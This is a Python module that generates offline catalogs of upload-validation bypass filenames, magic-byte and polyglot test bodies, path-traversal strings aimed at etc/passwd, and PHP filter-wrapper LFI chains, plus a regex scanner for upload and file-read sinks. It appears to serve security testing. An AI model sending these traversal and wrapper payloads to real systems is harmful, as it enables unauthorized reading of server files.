#!/usr/bin/env python3
"""Offline upload, polyglot, traversal, and LFI-wrapper catalogs.

All generated bodies are inert marker strings. Magic bytes are represented as
escaped text where necessary, so importing or calling this module cannot create
or execute a challenge artifact. Analysis is regex-only over bounded supplied
source/transcripts; archives and structured inputs are never opened.
"""

from __future__ import annotations

from dataclasses import asdict, dataclass
import re
from typing import Iterable
import urllib.parse


MAX_TEXT = 256_000
MAX_NAME = 128
MAX_TARGET = 512
MAX_DEPTH = 16


class UploadLFIInputError(ValueError):
    """Raised when a catalog input is unsafe or exceeds a fixed cap."""


@dataclass(frozen=True, slots=True)
class UploadCandidate:
    family: str
    name: str
    filename: str
    content_type: str
    content_literal: str
    purpose: str
    requirements: tuple[str, ...] = ()

    def to_dict(self) -> dict[str, object]:
        row = asdict(self)
        row.update({"inert": True, "offline": True, "network_requests": 0})
        return row


@dataclass(frozen=True, slots=True)
class LFICandidate:
    family: str
    name: str
    value: str
    decode_layers: int
    purpose: str
    requirements: tuple[str, ...] = ()

    def to_dict(self) -> dict[str, object]:
        row = asdict(self)
        row.update({"inert": True, "offline": True, "network_requests": 0})
        return row


@dataclass(frozen=True, slots=True)
class SurfaceFinding:
    area: str
    name: str
    kind: str
    evidence: str
    offset: int
    confidence: str

    def to_dict(self) -> dict[str, object]:
        return asdict(self)


_NAME = re.compile(r"^[A-Za-z0-9_-]{1,64}$")
_EXT = re.compile(r"^[A-Za-z0-9]{1,12}$")
_MIME = re.compile(r"^[A-Za-z0-9.+-]+/[A-Za-z0-9.+-]+$")


def _name(value: str, label: str) -> str:
    if not isinstance(value, str) or not _NAME.fullmatch(value):
        raise UploadLFIInputError(f"{label} must be 1..64 conservative ASCII characters")
    return value


def _extension(value: str, label: str) -> str:
    if not isinstance(value, str) or not _EXT.fullmatch(value):
        raise UploadLFIInputError(f"{label} must be a 1..12 character extension")
    return value.lower()


def _target(value: str) -> str:
    if not isinstance(value, str) or not value or len(value) > MAX_TARGET:
        raise UploadLFIInputError(f"target must contain 1..{MAX_TARGET} characters")
    if any(ord(char) < 32 for char in value) or any(char in value for char in "?#\x00"):
        raise UploadLFIInputError("target contains a URL/control delimiter")
    clean = value.replace("\\", "/").lstrip("/")
    segments = [segment for segment in clean.split("/") if segment not in ("", ".")]
    if not segments or any(segment == ".." for segment in segments):
        raise UploadLFIInputError("target must name a normalized relative file")
    return "/".join(segments)


def _bounded_text(value: str | bytes | bytearray, label: str) -> str:
    if isinstance(value, str):
        text = value
    elif isinstance(value, (bytes, bytearray)):
        text = bytes(value).decode("utf-8", "replace")
    else:
        raise UploadLFIInputError(f"{label} must be text or bytes")
    if len(text) > MAX_TEXT:
        raise UploadLFIInputError(f"{label} exceeds {MAX_TEXT} characters")
    return text


def upload_bypass_catalog(
    basename: str = "r5d_probe",
    blocked_extension: str = "php",
    allowed_extension: str = "jpg",
    marker: str = "R5D_UPLOAD_MARKER",
) -> tuple[UploadCandidate, ...]:
    """Return filename, media-type, and inert magic-prefix candidates."""

    basename = _name(basename, "basename")
    blocked = _extension(blocked_extension, "blocked_extension")
    allowed = _extension(allowed_extension, "allowed_extension")
    marker = _name(marker, "marker")
    ordinary = f"{basename}.{allowed}"
    filename_rows = (
        ("double_extension", f"{basename}.{blocked}.{allowed}", "last-extension versus inner-extension handling"),
        ("reverse_double_extension", f"{basename}.{allowed}.{blocked}", "first-extension versus last-extension handling"),
        ("mixed_case_extension", f"{basename}.{blocked.swapcase()}", "case-sensitive extension validation"),
        ("trailing_dot", f"{basename}.{blocked}.", "filesystem trailing-dot normalization"),
        ("encoded_trailing_space", f"{basename}.{blocked}%20", "decode and trailing-space normalization order"),
        ("semicolon_suffix", f"{basename}.{blocked};.{allowed}", "server path-parameter extension handling"),
        ("encoded_dot", f"{basename}%2e{blocked}", "percent decoding after extension validation"),
        ("fullwidth_dot", f"{basename}\uff0e{blocked}", "Unicode compatibility normalization after validation"),
        ("ntfs_ads", f"{basename}.{blocked}::$DATA.{allowed}", "alternate-data-stream and suffix handling"),
    )
    rows = [
        UploadCandidate(
            "filename", name, filename, "text/plain", marker, purpose,
            ("the target stores or interprets the normalized filename",),
        )
        for name, filename, purpose in filename_rows
    ]
    rows.extend(
        (
            UploadCandidate(
                "media_type", "declared_jpeg_plain_marker", ordinary, "image/jpeg", marker,
                "compare client-declared media type with content inspection",
                ("validation trusts the multipart Content-Type",),
            ),
            UploadCandidate(
                "media_type", "octet_stream_image_suffix", ordinary, "application/octet-stream", marker,
                "compare extension allowlisting with a generic media type",
                ("validation relies on filename rather than declared media type",),
            ),
            UploadCandidate(
                "magic_prefix", "gif89a_marker", f"{basename}.gif", "image/gif",
                f"GIF89a\\n{marker}", "identify shallow GIF magic-prefix checks",
                ("only a prefix/signature check is performed",),
            ),
            UploadCandidate(
                "magic_prefix", "jpeg_marker", ordinary, "image/jpeg",
                f"\\xFF\\xD8\\xFF\\xE0{marker}\\xFF\\xD9",
                "identify shallow JPEG magic-prefix checks",
                ("the file is not fully decoded and re-encoded",),
            ),
            UploadCandidate(
                "magic_prefix", "png_marker", f"{basename}.png", "image/png",
                f"\\x89PNG\\r\\n\\x1a\\n{marker}",
                "identify shallow PNG signature checks",
                ("the file is not fully decoded and re-encoded",),
            ),
            UploadCandidate(
                "polyglot", "pdf_comment_marker", f"{basename}.pdf", "application/pdf",
                f"%PDF-1.4\\n%{marker}\\n%%EOF",
                "test whether a PDF signature alone establishes type",
                ("validation checks only header/trailer markers",),
            ),
            UploadCandidate(
                "polyglot", "zip_local_header_marker", f"{basename}.zip", "application/zip",
                f"PK\\x03\\x04{marker}",
                "test whether a ZIP local-header prefix alone establishes type",
                ("validation does not open or verify the central directory",),
            ),
            UploadCandidate(
                "polyglot", "svg_text_marker", f"{basename}.svg", "image/svg+xml",
                f'<svg xmlns="http://www.w3.org/2000/svg"><text>{marker}</text></svg>',
                "distinguish active XML image handling from raster re-encoding",
                ("SVG is accepted and served without sanitizing active features",),
            ),
        )
    )
    return tuple(rows)


def multipart_preview(
    candidate: UploadCandidate, *, field: str = "file", boundary: str = "R5D_BOUNDARY"
) -> str:
    """Render an inert multipart body as text; no request is created or sent."""

    if not isinstance(candidate, UploadCandidate):
        raise UploadLFIInputError("candidate must be an UploadCandidate")
    field = _name(field, "field")
    boundary = _name(boundary, "boundary")
    if len(candidate.filename) > MAX_NAME or any(
        char in candidate.filename for char in ('"', "\r", "\n", "\x00")
    ):
        raise UploadLFIInputError("candidate filename is not safe for a multipart preview")
    if not _MIME.fullmatch(candidate.content_type):
        raise UploadLFIInputError("candidate content type is invalid")
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field}"; filename="{candidate.filename}"\r\n'
        f"Content-Type: {candidate.content_type}\r\n\r\n"
        f"{candidate.content_literal}\r\n"
        f"--{boundary}--\r\n"
    )


def traversal_catalog(target: str = "etc/passwd", *, depth: int = 6) -> tuple[LFICandidate, ...]:
    """Return common traversal spellings for a normalized relative target."""

    clean = _target(target)
    if isinstance(depth, bool) or not isinstance(depth, int) or not 1 <= depth <= MAX_DEPTH:
        raise UploadLFIInputError(f"depth must be an integer from 1 to {MAX_DEPTH}")
    up = "../" * depth
    back = "..\\" * depth
    rows = (
        ("plain", up + clean, 0, "ordinary POSIX parent traversal"),
        ("backslash", back + clean.replace("/", "\\"), 0, "Windows separator traversal"),
        ("percent_slash", ("..%2f" * depth) + clean, 1, "percent decoding before path resolution"),
        ("percent_backslash", ("..%5c" * depth) + clean.replace("/", "%5c"), 1, "encoded Windows separators"),
        ("double_encoded", ("%252e%252e%252f" * depth) + clean, 2, "two URL-decoding layers"),
        ("mixed_encoded", (".%2e/" * depth) + clean, 1, "mixed literal/encoded parent segments"),
        ("collapsed_dots", ("....//" * depth) + clean, 0, "single-pass replacement followed by path normalization"),
        ("absolute_posix", "/" + clean, 0, "absolute-path acceptance"),
        ("file_uri", "file:///" + clean, 0, "URI-aware file resolution"),
        ("null_suffix", up + clean + "%00.r5d", 1, "legacy NUL truncation before suffix enforcement"),
    )
    return tuple(
        LFICandidate(
            "traversal", name, value, layers, purpose,
            ("the application resolves user-controlled path text",),
        )
        for name, value, layers, purpose in rows
    )


def lfi_wrapper_catalog(target: str = "etc/passwd") -> tuple[LFICandidate, ...]:
    """Return read-oriented wrappers; execution/deserialization wrappers are omitted."""

    clean = _target(target)
    absolute = "/" + clean
    encoded = urllib.parse.quote(absolute, safe="/")
    rows = (
        (
            "php_filter_base64", f"php://filter/convert.base64-encode/resource={absolute}",
            "read binary/text content through a reversible transfer encoding",
            ("PHP stream wrappers are accepted", "the response exposes filter output"),
        ),
        (
            "php_filter_named_read", f"php://filter/read=convert.base64-encode/resource={absolute}",
            "exercise the explicit read-filter grammar", ("PHP stream wrappers are accepted",),
        ),
        (
            "php_filter_chain",
            f"php://filter/convert.iconv.UTF-8.UTF-16LE|convert.base64-encode/resource={absolute}",
            "detect multiple read-filter stages and recover transformed content offline",
            ("the iconv and base64 filters are available",),
        ),
        (
            "php_rot13_control", f"php://filter/string.rot13/resource={absolute}",
            "provide a visibly transformed read control", ("the rot13 stream filter is available",),
        ),
        (
            "file_uri", f"file://{absolute}", "test URI-aware local-file reading",
            ("the sink accepts file URIs",),
        ),
        (
            "percent_encoded_file_uri", "file://" + encoded.replace("/", "%2f"),
            "compare wrapper recognition before and after URL decoding",
            ("the sink performs URL decoding before opening the resource",),
        ),
        (
            "jar_entry_example", "jar:file:///app.jar!/BOOT-INF/classes/application.properties",
            "represent a read-only Java archive-entry lookup",
            ("the sink uses a Java URL handler and the named archive exists",),
        ),
        (
            "data_marker_control", "data://text/plain,R5D_LFI_MARKER",
            "detect generic wrapper support without reading a host file", ("the data wrapper is enabled",),
        ),
    )
    return tuple(
        LFICandidate("lfi_wrapper", name, value, 0, purpose, requirements)
        for name, value, purpose, requirements in rows
    )


def lfi_chain_catalog(
    target: str = "etc/passwd", *, depth: int = 6
) -> tuple[LFICandidate, ...]:
    """Compose read-only wrapper and traversal stages as reviewable strings."""

    traversal = {row.name: row for row in traversal_catalog(target, depth=depth)}
    plain = traversal["plain"].value
    double = traversal["double_encoded"].value
    rows = (
        (
            "php_filter_after_traversal",
            f"php://filter/convert.base64-encode/resource={plain}",
            0,
            "combine parent traversal with a reversible read filter",
            ("PHP wrappers are accepted", "relative resource paths are resolved by the include sink"),
        ),
        (
            "encoded_php_filter_after_traversal",
            "php:%2f%2ffilter%2fconvert.base64-encode%2fresource=" + plain.replace("/", "%2f"),
            1,
            "delay wrapper and traversal separators until one URL-decoding layer",
            ("URL decoding precedes wrapper resolution",),
        ),
        (
            "double_encoded_traversal_in_filter",
            f"php://filter/convert.base64-encode/resource={double}",
            2,
            "place a two-layer traversal behind a read filter",
            ("the resource portion is decoded twice before filesystem resolution",),
        ),
        (
            "rot13_traversal_control",
            f"php://filter/string.rot13/resource={plain}",
            0,
            "provide a visibly transformed control for the same traversed resource",
            ("the rot13 stream filter is available",),
        ),
    )
    return tuple(
        LFICandidate("lfi_chain", name, value, layers, purpose, requirements)
        for name, value, layers, purpose, requirements in rows
    )


_SURFACE_PATTERNS: tuple[tuple[str, str, str, str, re.Pattern[str]], ...] = (
    ("upload", "client_content_type", "risk", "medium", re.compile(r"(?i)\b(?:mimetype|content[-_ ]type)\b[^\n]{0,100}(?:allow|image/)")),
    ("upload", "extension_allowlist", "control", "medium", re.compile(r"(?i)\b(?:allowed_extensions?|extensions?\.(?:contains|includes)|endsWith)\b")),
    ("upload", "magic_inspection", "control", "high", re.compile(r"(?i)\b(?:finfo_file|magic\.from|imghdr|filetype|exif_imagetype)\b")),
    ("upload", "image_reencode", "control", "high", re.compile(r"(?i)\b(?:Image\.open|imagecreatefrom|sharp\s*\(|re-?encode)\b")),
    ("upload", "original_filename", "risk", "medium", re.compile(r"(?i)\b(?:originalname|original_filename|client_filename|filename)\b[^\n]{0,100}(?:save|move|join|path)")),
    ("upload", "archive_extraction", "risk", "medium", re.compile(r"(?i)\b(?:extractall|ZipFile|unzip|archive)\b")),
    ("lfi", "file_read_sink", "risk", "high", re.compile(r"(?i)\b(?:include|require|readfile|send_file|sendFile|open|read_text)\s*\(")),
    ("lfi", "path_join", "context", "medium", re.compile(r"(?i)\b(?:path\.join|os\.path\.join|Paths\.get|resolve)\s*\(")),
    ("lfi", "canonical_prefix_check", "control", "medium", re.compile(r"(?i)\b(?:realpath|resolve|canonicalPath)\b[^\n]{0,160}(?:startsWith|startswith|commonpath)")),
    ("lfi", "decode_before_normalize", "context", "medium", re.compile(r"(?i)\b(?:urldecode|unquote|decodeURIComponent)\s*\([^\n]{0,100}\b(?:normalize|resolve|realpath)\b")),
)


def analyze_upload_lfi_surface(
    supplied_text: str | bytes | bytearray,
) -> tuple[SurfaceFinding, ...]:
    """Identify upload/path controls and sinks in bounded supplied text."""

    text = _bounded_text(supplied_text, "supplied_text")
    rows: list[SurfaceFinding] = []
    for area, name, kind, confidence, pattern in _SURFACE_PATTERNS:
        match = pattern.search(text)
        if match:
            rows.append(
                SurfaceFinding(
                    area, name, kind,
                    text[max(0, match.start() - 48) : min(len(text), match.end() + 96)],
                    match.start(), confidence,
                )
            )
    return tuple(sorted(rows, key=lambda row: (row.offset, row.area, row.name)))


def rows_as_dicts(
    rows: Iterable[UploadCandidate | LFICandidate | SurfaceFinding],
) -> tuple[dict[str, object], ...]:
    out = []
    for row in rows:
        to_dict = getattr(row, "to_dict", None)
        if not callable(to_dict):
            raise UploadLFIInputError("each row must expose a to_dict() method")
        out.append(to_dict())
    return tuple(out)
